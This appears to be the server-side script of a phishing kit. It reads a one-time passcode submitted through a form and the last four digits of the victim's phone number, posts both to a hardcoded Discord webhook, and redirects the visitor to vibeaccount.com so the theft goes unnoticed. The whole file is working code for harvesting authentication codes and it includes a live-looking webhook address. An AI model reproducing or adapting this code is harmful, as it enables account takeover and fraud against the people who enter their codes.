<?php
session_start();

// Grab last 4 digits of phone number
$last4 = $_SESSION['phone_last4'] ?? 'XXXX';

// Grab OTP submitted
$otp = preg_replace('/\D/', '', $_POST['otp'] ?? '');

// Send to webhook
$webhookUrl = "
https://discord.com/api/webhooks/1536976905109118976/JNE8Pc3IDdB7FsmTRnu5trIRSy-OJZKYOp52N4V7AeWSwN5quwPMYWlELnj8hRHdtPfw";
$message = [
    "content" => "OTP submitted: `$otp` | Phone last 4 digits: `$last4`"
];
$payload = json_encode($message);

$ch = curl_init($webhookUrl);
curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_exec($ch);
curl_close($ch);

// Redirect to success page
header("Location: https://vibeaccount.com");
exit();
?>